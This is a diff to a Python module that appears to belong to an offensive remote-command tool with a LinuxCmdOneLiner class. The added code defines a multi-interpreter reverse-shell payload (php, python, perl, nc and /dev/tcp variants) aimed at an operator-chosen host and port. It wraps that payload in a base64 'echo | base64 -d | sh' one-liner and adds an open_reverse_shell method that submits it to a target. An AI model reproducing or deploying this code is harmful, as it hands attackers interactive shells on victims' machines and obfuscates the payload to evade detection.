@@ -54,6 +54,40 @@ do
 done
 """
 
+REVERSE_SHELL_PAYLOAD = """
+if command -v php > /dev/null 2>&1; then
+  php -r '$sock=fsockopen("{host}",{port});$proc=proc_open("sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+  exit;
+fi
+
+if command -v python > /dev/null 2>&1; then
+  python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{host}",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+  exit;
+fi
+
+if command -v perl > /dev/null 2>&1; then
+  perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+  exit;
+fi
+
+if command -v nc > /dev/null 2>&1; then
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f
+  exit;
+fi
+
+if command -v sh > /dev/null 2>&1; then
+  /bin/sh -i >& /dev/tcp/{host}/{port} 0>&1
+  exit;
+fi
+"""
+
+
+def reverse_shell_payload(host: str, port: int):
+    payload = REVERSE_SHELL_PAYLOAD.replace("{host}", host).replace("{port}", str(port))
+    payload = base64.b64encode(payload.encode()).decode()
+    payload = f"echo {payload} | base64 -d | sh"
+    return payload
+
 
 def shell_command(args: t.List[str]):
     """转译命令或命令参数"""
@@ -334,6 +368,9 @@ class LinuxCmdOneLiner:
         coros = [download_chunk(i) for i in range(1, filesize + 1, chunk_size)]
         chunks = await asyncio.gather(*coros)
         return b"".join(chunks)
+
+    async def open_reverse_shell(self, host: str, port: int) -> None:
+        await self.submit(reverse_shell_payload(host, port))
 
     async def send_bytes_over_tcp(
         self,
